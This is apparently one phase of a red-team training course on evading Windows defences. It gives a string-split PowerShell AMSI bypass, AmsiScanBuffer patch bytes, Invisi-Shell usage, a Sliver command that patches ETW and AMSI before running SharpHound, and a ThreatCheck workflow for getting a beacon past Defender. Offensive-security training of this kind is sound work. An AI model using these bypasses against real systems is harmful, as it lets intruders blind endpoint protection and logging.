# Phase 04: AMSI, ETW & AV Bypass

> **Why this phase exists**: Phase 03 explained what each detection layer is. Now you build the bypasses. These aren't one-liners to memorize — they're techniques you need to understand well enough to adapt when they stop working.

**Study time**: 1 week
**Difficulty**: Intermediate–Advanced

---

## Learning Objectives

- [ ] Explain what AMSI's `AmsiScanBuffer` function does and why patching it works
- [ ] Build and test an AMSI bypass that survives current Defender signatures
- [ ] Explain what ETW is and why patching `EtwEventWrite` silences .NET telemetry
- [ ] Use Invisi-Shell for a reliable AMSI+logging bypass
- [ ] Understand sleep obfuscation conceptually (why memory scanning is a problem)

---

## 1. AMSI — What's Actually Happening

### The AMSI call chain

```
PowerShell script block runs
→ PowerShell calls AmsiInitialize() — loads amsi.dll into process
→ For each script block: calls AmsiScanBuffer(content, length)
→ amsi.dll passes content to registered AMSI providers (Windows Defender = default)
→ Provider returns AMSI_RESULT_CLEAN (1) or AMSI_RESULT_DETECTED (32768)
→ If detected → PowerShell throws "this script contains malicious content" error
```

**The attack surface**: `AmsiScanBuffer` is a function in `amsi.dll` loaded into the PowerShell process. You're running in the same process. You can patch that function's code.

### The patch explained

`AmsiScanBuffer` checks the buffer and returns a result. If you patch it to **always return `AMSI_RESULT_CLEAN`** (value 1), every scan passes regardless of content.

The patch in bytes:
```
B8 57 00 07 80  →  mov eax, 0x80070057   (returns E_INVALIDARG error)
C3              →  ret                    (returns immediately)
```

This makes `AmsiScanBuffer` return an error on every call. PowerShell treats AMSI errors as "scan skipped" — content runs anyway.

### Why your bypass needs obfuscation

The bypass *code itself* contains strings like `"AmsiScanBuffer"` and `"amsi.dll"`. AMSI scans your bypass before running it, catching it before it can patch itself. Solution: encode or obfuscate the bypass so those strings don't appear literally.

```powershell
# WRONG — AMSI catches this before it runs:
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# RIGHT — split the strings so AMSI can't match them:
$t = 'System.Management.Automation.A'+'msiUtils'
$f = 'amsi'+'InitFailed'
[Ref].Assembly.GetType($t).GetField($f,'NonPublic,Static').SetValue($null,$true)
```

### Invisi-Shell — The Reliable Option

Invisi-Shell patches AMSI at the .NET CLR level, before PowerShell's AMSI integration even loads. More reliable than inline patches because it operates at a lower level.

```bash
# Download
git clone https://github.com/OmerYa/Invisi-Shell

# Run — launches a new PowerShell session with AMSI/logging disabled
.\RunWithRegistryNonAdmin.bat    # if standard user
.\RunWithPathAsAdmin.bat         # if admin

# Everything in this shell runs without AMSI scanning
# PowerShell Script Block Logging also disabled
```

**When to use Invisi-Shell**: When you need an interactive PowerShell session and want everything disabled cleanly. Ideal for exam scenarios where you get a WinRM shell and want to run PowerView.

**Practice task**: Set up a Windows VM with Defender on. Paste `"AmsiUtils"` into PowerShell — it should fail. Use Invisi-Shell. Paste `"AmsiUtils"` again — it should succeed. Then paste the full PowerView script and run `Get-Domain`.

---

## 2. ETW — Why It Matters for .NET Tools

### What ETW is doing

Event Tracing for Windows is a kernel-level pub/sub system. Producers (Windows components, .NET CLR, your code) emit events. Consumers (Defender, EDRs, SIEMs) subscribe to event channels and receive real-time telemetry.

For .NET specifically:
- Every assembly load emits an ETW event
- Every JIT compilation emits an event
- Method calls can be traced

This means loading SharpHound via `Assembly.Load()` emits ETW events that say "hey, this process just loaded an assembly called SharpHound." Defender's ETW subscription catches that.

### The patch

`EtwEventWrite` in `ntdll.dll` is the function every ETW producer calls to emit events. Patch it to return immediately → nothing is emitted → consumers see nothing.

```csharp
// Conceptual — not paste-and-use (the specific bytes are signatured)
// Find EtwEventWrite in ntdll
// Change first bytes to: ret (0xC3)
// Now all ETW events from this process are silenced
```

**Important**: ETW patching requires the same process that will emit the events. For PowerShell-based execution, you patch within the PowerShell process. For C# tools run via execute-assembly, the beacon process needs patching before loading the tool.

### Practical ETW bypass via execute-assembly

Modern C2 frameworks (Havoc, some Sliver builds) can inject ETW patches before running execute-assembly. In Sliver you can combine an AMSI/ETW bypass library with your tool:

```bash
# Use InlineExecute-Assembly which handles ETW patching
sliver (beacon) > execute-assembly ~/tools/InlineExecute-Assembly.exe \
  --dotnetassembly ~/tools/SharpHound.exe \
  --assemblyargs "-c All --zip" \
  --etw true --amsi true
```

---

## 3. AV Bypass for Binaries — Practical Workflow

### Step 1: Check if it's caught
```bash
# Transfer binary to test VM
# Watch Windows Security notification — caught = immediate popup
# Or check event log: Event Viewer → Windows Logs → Security → Event 1116
```

### Step 2: Find the trigger
```powershell
# ThreatCheck does binary search — splits the file in half repeatedly
.\ThreatCheck.exe -f beacon.exe -e Defender
# Output: "Bad bytes between offset 0x1234 and 0x1245"
# Those bytes are the signature
```

### Step 3: Fix the trigger

Options:
- **Recompile from source** with renamed functions/strings matching the offset
- **Hex edit**: find the bytes at that offset in a hex editor, change them to something benign
- **Use PEzor** to automatically apply multiple evasion transforms
- **Change the format**: instead of EXE, deliver as shellcode loaded by a clean loader

### Step 4: Retest → repeat until clean

---

## 4. Sleep Obfuscation — Why Memory Scanning Matters

Modern EDRs don't just scan files. They periodically scan process memory looking for known shellcode patterns. Your beacon is sitting in memory with its shellcode — visible.

**Sleep obfuscation** solves this by encrypting the beacon's own memory while it's sleeping, then decrypting before executing:

```
Beacon wakes up → executes → completes task → before sleeping:
  XOR-encrypts its own shellcode in memory
  Calls Sleep(interval)
  On wake: XOR-decrypts its own shellcode
  Executes next task
```

During the sleep period, the memory looks like random garbage — no shellcode signatures.

**Ekko** (open source) implements this for C-based shellcode. **Havoc's Demon** has it built in. Sliver's default doesn't use sleep obfuscation — one reason to prefer Havoc in heavily monitored environments.

**For the exam**: The exam environment likely doesn't have a memory scanner running continuously. Defender's real-time protection is the main concern. Sleep obfuscation is a good-to-know concept but not typically necessary for the CRTeamer exam specifically.

---

## Practice Labs

| Lab | Platform | Focus |
|-----|---------|-------|
| [THM: Bypassing UAC](https://tryhackme.com/room/bypassinguac) | THM (Free) | Security bypass concepts |
| [THM: AV Evasion: Shellcode](https://tryhackme.com/room/avevasionshellcode) | THM (Sub) | Shellcode evasion hands-on |
| [ired.team: AMSI Bypass](https://www.ired.team/offensive-security/defense-evasion/amsi-bypass) | Free | Deep AMSI reference |
| Manual: AMSI bypass lab | Your lab | Defeat Defender on live PS session — 3 different methods |

---

## Phase 04 Mastery Checklist

- [ ] Can you explain why patching `AmsiScanBuffer` prevents AMSI from detecting scripts?
- [ ] Can you set up Invisi-Shell and confirm AMSI is disabled (test with `"AmsiUtils"`)?
- [ ] Can you explain what ETW does and why patching `EtwEventWrite` silences .NET telemetry?
- [ ] Can you use ThreatCheck to locate the exact detection trigger in a Sliver beacon?
- [ ] Can you get a Sliver beacon past Defender using at least 2 different methods?
- [ ] Can you explain what sleep obfuscation does and why it defeats memory scanning?

---

## Next Phase → **Phase 05: Initial Access in Assumed Breach Scenarios**
